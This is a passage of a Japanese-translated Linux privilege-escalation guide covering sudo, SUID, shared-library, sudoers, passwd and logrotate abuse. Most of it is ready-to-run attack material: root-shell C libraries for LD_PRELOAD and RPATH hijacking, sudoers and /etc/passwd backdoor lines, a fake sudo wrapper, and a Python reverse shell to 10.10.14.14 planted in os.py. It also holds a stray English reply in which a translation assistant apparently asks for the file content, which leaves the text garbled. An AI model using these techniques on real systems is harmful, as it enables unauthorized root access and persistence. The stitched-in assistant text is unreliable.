sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の **予期しないコマンドはファイルの読み取りや書き込み、さらにはコマンドの実行を可能にします。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーはパスワードを知らなくても別のユーザーの権限でコマンドを実行できる可能性があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。root ディレクトリに ssh キーを追加するか、`sh` を呼び出すことでシェルを取得するのは容易です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが実行時に **環境変数を設定する** ことを可能にします:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer** に基づいており、スクリプトを root として実行する際に任意の python ライブラリを読み込むために **PYTHONPATH hijacking** に**脆弱**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 実行でパスをバイパスする

**Jump** で他のファイルを読むか、**symlinks** を使う。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使用されている (\*), さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary (コマンドのパス指定なし)

If the **sudo の権限** が単一のコマンドに対して **パスを指定せずに** 与えられている場合: _hacker10 ALL= (root) less_ PATH変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが **パスを指定せずに別のコマンドを実行する場合（不審な SUID バイナリの内容は必ず _**strings**_ で確認してください）** にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドのパス指定あり）

もし **suid** バイナリが **パスを指定して別のコマンドを実行している** 場合、suid ファイルが呼び出すコマンド名と同じ名前の関数を作成して **関数をexportする** ことを試すことができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成して export してみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、ローダーが標準 C ライブラリ (`libc.so`) を含む他のすべてのライブラリより前に読み込む、1つまたは複数の共有ライブラリ（.so ファイル）を指定するために使用されます。この操作はライブラリのプリロードとして知られています。

ただし、システムのセキュリティを維持し、特に **suid/sgid** 実行ファイルでこの機能が悪用されるのを防ぐために、システムはいくつかの条件を強制します：

- 実行ファイルの real user ID (_ruid_) が effective user ID (_euid_) と一致しない場合、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルについては、標準パスにありかつ同様に suid/sgid であるライブラリのみがプリロードされます。

Privilege escalation は、`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるようになり、結果として特権を昇格した状態で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、以下のコマンドで**コンパイル**します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が**LD_LIBRARY_PATH**環境変数を制御していると、ライブラリが検索されるパスを制御できるため、同様のprivescを悪用できます。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常と異なるように見える **SUID** 権限を持つバイナリに遭遇した場合、**.so** ファイルを正しくロードしているか確認するのが良い習慣です。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性が示唆されます。

これを悪用するには、Cファイル、例えば _"/path/to/.config/libcalc.c"_ を作成し、次のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、特権付きのシェルを実行することで権限を昇格させることを目的としています。

上記のCファイルを共有オブジェクト（.so）ファイルにコンパイルするには、次のようにします：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit が発動し、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なfolderからlibraryをロードするSUID binaryを見つけたので、そのfolderに必要な名前でlibraryを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という名前の関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者に悪用されうる Unix バイナリのキュレートされた一覧です。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のもので、コマンドに**引数のみ注入できる**場合に該当します。

このプロジェクトは、restricted shells からの脱出、権限昇格や維持、ファイル転送、bind や reverse shells の生成、その他の post-exploitation タスクを容易にするために利用できる、Unix バイナリの正当な機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

もし `sudo -l` にアクセスできるなら、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、任意の sudo ルールを悪用する方法が見つかるかを確認できます。

### Reusing Sudo Tokens

パスワードは知らないが sudo アクセスがある場合、sudo コマンドの実行を待ち、セッショントークンをハイジャックすることで権限を昇格できます。

権限昇格の要件:

- 既にユーザ "_sampleuser_" としてシェルを持っていること
- "_sampleuser_" が過去 **15mins** に何かを実行するために **`sudo` を使用していること**（デフォルトでは、これがパスワード入力なしで `sudo` を使える sudo トークンの有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` が利用可能であること（アップロードできること）

(一時的に `ptrace_scope` を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、恒久的に `/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` を設定します)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の **exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って **自分のセッションの sudo トークンを有効化** できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 2番目の **exploit** (`exploit_v2.sh`) は _/tmp_ に sh shell を作成し、**root が所有し setuid が付与されます**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成する**ことで **sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにする**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ内、またはフォルダ内で作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して、**ユーザーとPIDのための sudo token を作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザー（PID 1234）としてシェルを持っている場合、パスワードを知らなくても **sudo privileges** を取得できます。以下を実行します:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるかとその方法を設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読み取り可能です**。\
**もし**このファイルを**読む**ことができれば、**興味深い情報を取得する**ことができるかもしれません、そして任意のファイルに**書き込む**ことができれば**escalate privileges**できるようになります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD用の`sudo`バイナリの代替として`doas`などがあります。設定は`/etc/doas.conf`で確認することを忘れないでください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して `sudo` を使用して**権限を昇格することがわかっていて、かつそのユーザーコンテキストでシェルを取得している場合、root として自分のコードを実行し、その後でユーザーのコマンドを実行するような**新しい sudo 実行ファイルを作成**できます。次に、ユーザーコンテキストの **$PATH**（例: 新しいパスを `.bash_profile` に追加）を変更して、ユーザーが `sudo` を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために他のファイルを変更する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または次のようなコマンドを実行する：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれる設定ファイルの出所** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは **別のフォルダを指しており**、そこで **ライブラリが検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内をライブラリの検索対象とします**。

もし何らかの理由で、指定されたパス：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルが指す任意のフォルダ に対して **ユーザが書き込み権限を持っている** 場合、特権を昇格できる可能性があります.\  
このミスコンフィグレーションを**どのように悪用するか**は、次のページをご覧ください：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定された通りにその場所からプログラムによって利用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを以下のコマンドで作成します： `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセットを提供します**。これにより root の**権限がより小さく明確な単位に分割されます**。これらの各単位は個別にプロセスへ付与できるため、権限の全体集合が縮小され、悪用のリスクが低減します。\
以下のページを読んで、capabilities とそれを悪用する方法について**詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" のビット**は影響を受けるユーザーが "**cd**" でフォルダに入れることを意味します。\
**"read"** ビットはユーザーが**ファイルを一覧表示**できることを意味し、**"write"** ビットはユーザーが**ファイルを削除**および**新規作成**できることを意味します。

## ACLs

Access Control Lists (ACLs) は裁量的なパーミッションの二次層を表し、従来の ugo/rwx パーミッションを**上書きできる**ものです。これらのパーミッションは、オーナーでもグループの一員でもない特定のユーザーに対してアクセス権を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。\
このレベルの**細粒度により、より正確なアクセス管理が可能になります**。Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**付与する** ユーザー "kali" にファイルの read と write パーミッションを与える:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定のACLsを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開かれた shell セッション

**古いバージョン**では、別のユーザー（**root**）の**shell**セッションを**hijack**できることがあります。\
**最新のバージョン**では、**自分のユーザー**のscreenセッションにのみ**接続**できます。ただし、**セッション内の興味深い情報**が見つかることがあります。

### screen セッション hijacking

**screen セッションの一覧**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッション hijacking

これは**古い tmux バージョン**の問題でした。root によって作成された tmux (v2.1) セッションを特権のないユーザーとして hijack できませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian 系システム（Ubuntu, Kubuntu など）で生成されたすべての SSL および SSH キーは、このバグの影響を受ける可能性があります。\
このバグはこれらの OS で新しい ssh キーを作成する際に発生し、**可能な組み合わせがわずか 32,768 通りしかなかった**ためです。つまり、すべての可能性を計算でき、**ssh 公開鍵を持っていれば対応する秘密鍵を検索できる**ということです。計算済みの候補はここで見つかります: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、空のパスワード文字列のアカウントでのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh でログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵のみでログインできます
- `forced-commands-only`: root は秘密鍵のみで、かつ commands オプションが指定されている場合にのみログインできます
- `no`: ログイン不可

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置換されます。**絶対パスを指定できます**（`/` で始まる）や **ユーザーのホームからの相対パス** を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとした場合、ssh があなたのキーの公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（passphrases無し！）鍵を置いておく代わりに、**use your local SSH keys instead of leaving keys** ことができます。これにより、ssh で **to a host** に **jump** し、そこから **initial host** にある **key** を **using** して別のホストへ **jump to another** ことができるようになります。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの**オプション**を**上書き**し、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent フォワーディングを**許可**または**拒否**できます（デフォルトは許可）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに**実行されるスクリプト**です。したがって、これらのいずれかに**書き込みまたは変更できれば権限を昇格させることができます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OSによっては、`/etc/passwd`や`/etc/shadow`ファイルが別名になっていたり、バックアップが存在することがあります。したがって、**すべてを見つけ出し**、**読み取れるか確認**して、ファイル内に**hashesが含まれているか**を確認することを推奨します：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に **password hashes** を見つけることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

最初に、以下のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don’t have the file content. Please paste the contents of src/linux-hardening/privilege-escalation/README.md that you want translated.

Also confirm:
- Do you want me to generate a strong password and insert it into the translated README as plain text?
- If yes, any password rules (length, include symbols/numbers/uppercase)?

I’ll then return the translated Markdown (Japanese) with the added user line for `hacker` and the generated password.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` として切り替えることができます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**いくつかの機密ファイルに書き込みできるか**を確認してください。たとえば、**サービスの設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを実行していて、**/etc/systemd/ 内の Tomcat サービス構成ファイルを変更できる** 場合、次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor は、tomcat が次に起動したときに実行されます。

### フォルダを確認する

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のものはおそらく読み取れないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 過去数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む可能性がある既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読んでください。これは**パスワードを含んでいる可能性のある複数のファイル**を検索します。\
**この目的で使えるもう一つの興味深いツール**は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)で、ローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです（Windows, Linux & Mac向け）。

### ログ

ログを読めるなら、**そこで興味深い/機密情報を見つけられるかもしれません**。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、設定が「**bad**」(backdoored?) な**audit logs**は、投稿で説明されているように**audit logs**内に**パスワードを記録**させることを可能にする場合があります: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むためには、グループ [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に単語 "**password**" を含むファイルを確認し、ログ内の IP や email、ハッシュの regexps もチェックしてください。\
ここではそのやり方をすべて列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最終チェックを参照してください。

## 書き込み可能なファイル

### Python library hijacking

もし**どこから**pythonスクリプトが実行されるか分かっていて、そのフォルダに**書き込み可能**であるか、または**pythonライブラリを修正できる**なら、OSライブラリを改変して backdoor を仕込むことができます（pythonスクリプトが実行される場所に書き込み可能であれば、os.py ライブラリをコピー＆ペーストしてください）。

ライブラリに**backdoor を仕込む**には、os.py ライブラリの末尾に以下の行を追加してください（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **write permissions** を持つユーザーが権限を昇格させられる可能性があります。これは `logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。_ /var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリのパーミッションを確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常に類似しています。したがって、ログを変更できることが分かった場合は、そのログを誰が管理しているかを確認し、ログをシンボリックリンクに置き換えて権限昇格が可能かどうかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを**write** できる、または既存のスクリプトを**adjust** できる場合、あなたの**system is pwned**。

Network scripts（例えば _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルとまったく同じです。しかし、これらは Linux 上で Network Manager (dispatcher.d) によって ~sourced~ されます。

私の場合、これらの network スクリプト内の `NAME=` の扱いが正しくありません。**名前に空白がある場合、システムは空白の後の部分を実行しようとします。** つまり、**最初の空白以降のすべてが root として実行される**ということです。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間に空白があることに注意_)

### **init, init.d, systemd, and rc.d**

